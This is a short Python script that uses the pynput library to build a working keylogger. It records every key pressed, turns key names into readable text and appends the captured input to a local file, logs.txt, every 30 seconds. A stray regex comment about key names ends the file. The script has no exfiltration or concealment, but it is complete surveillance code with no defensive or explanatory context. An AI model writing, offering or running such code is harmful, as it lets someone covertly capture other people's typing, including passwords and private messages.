from pynput.keyboard import Listener
from threading import Timer

log = ''


def report():
    global log
    if log != '':
        with open('logs.txt', 'a+') as f:
            f.write(log)
        log = ''
    Timer(30, report).start()


def on_press(key):
    global log
    k = str(key)
    if len(k) > 4:
        if 'Key.space' in k:
            log += ' '
        else:
            log += ' '+str(key)+' '
    else:
        log += k[1]


report()

with Listener(on_press=on_press) as listener:
    listener.join()
# Key.(?!backspace\b)\b\w+
